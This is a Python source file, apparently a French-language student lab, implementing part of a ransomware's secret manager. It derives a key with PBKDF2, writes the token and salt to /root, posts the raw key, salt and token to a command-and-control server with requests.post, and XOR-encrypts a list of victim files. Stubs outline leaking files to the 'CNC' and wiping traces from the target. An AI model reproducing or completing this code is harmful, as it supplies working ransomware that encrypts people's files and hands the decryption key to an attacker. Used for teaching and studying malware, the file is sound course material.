from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

                    #self permet d'acceder aux variables de la class
    def do_derivation(self, salt:bytes, key: bytes) -> bytes: #On sait que l'on doit retourner une clé de type bytes
        cle_derive= PBKDF2HMAC(algorithm=hashes.SHA256() # 'algorithm' permet d'appeller la classe SHA256() et l'utiliser
                               ,length=self.KEY_LENGTH,salt=salt,iterations=self.ITERATION,) #Paramètre de clé et d'itération pour hasher. 
        return cle_derive.derive(key) #la fonction génère et retourne une nouvelle cle à partir de l'ancienne après 48000 itérations

    def create(self) -> Tuple[bytes, bytes, bytes]: #On doit retourner la cle, le sel, et le token obtenue avec les deux
        salt = secrets.token_bytes(self.SALT_LENGTH) #Renvoie une chaîne d'octets aléatoire   de taille SALT_LENGTH
        key = secrets.token_bytes(self.KEY_LENGTH) #Renvoie une chaîne d'octets aléatoire   de taille KEY_LENGTH
        token = self.do_derivation(salt, key)[:self.TOKEN_LENGTH] #On utilise la fonction juste au dessus qu'on vient de faire pour hasher
        return salt, key, token                                   #la taille est donnée par la variable TOKEN_LENGTH
        #à ce stade, la clé est bien hashé, un token est généré par cette clé et le salt qui est bien aléatoire.

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes) -> None:
        url = f"http://{self._remote_host_port}/new"  #j'insère l'url prédéfinis avec f et ajoute le /new sous entendu par le sujet
        data = {
            "token": self.bin_to_b64(token), #conversion en base64
            "salt": self.bin_to_b64(salt),   #conversion en base64
            "key": self.bin_to_b64(key)}     #conversion en base64
        requests.post(url, json=data)   #Utilisation de la fonction post de request qui prend un url et la data à envoyer en paramètres

    def setup(self) -> None:
        token_path = os.path.join(self._path, "token.bin")
        salt_path = os.path.join(self._path, "salt.bin")

        if os.path.exists(token_path): #exists me permet de vérifier si /root/token.bin existe déjà
            print("attention token.bin déjà existant")
        else:
            salt, key, token = self.create() #Utilisation de create codé auparavant

            token_file = open(token_path, "wb")
            token_file.write(token) #ecriture de token dans token_file en binaire
            token_file.close()

            salt_file = open(salt_path, "wb")
            salt_file.write(salt) # "" 
            salt_file.close()

            self.post_new(salt, key, token) #Utilisation de post_new codé auparavant

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        raise NotImplemented()

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file_path in files:
            xorfile(file_path, self._key)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()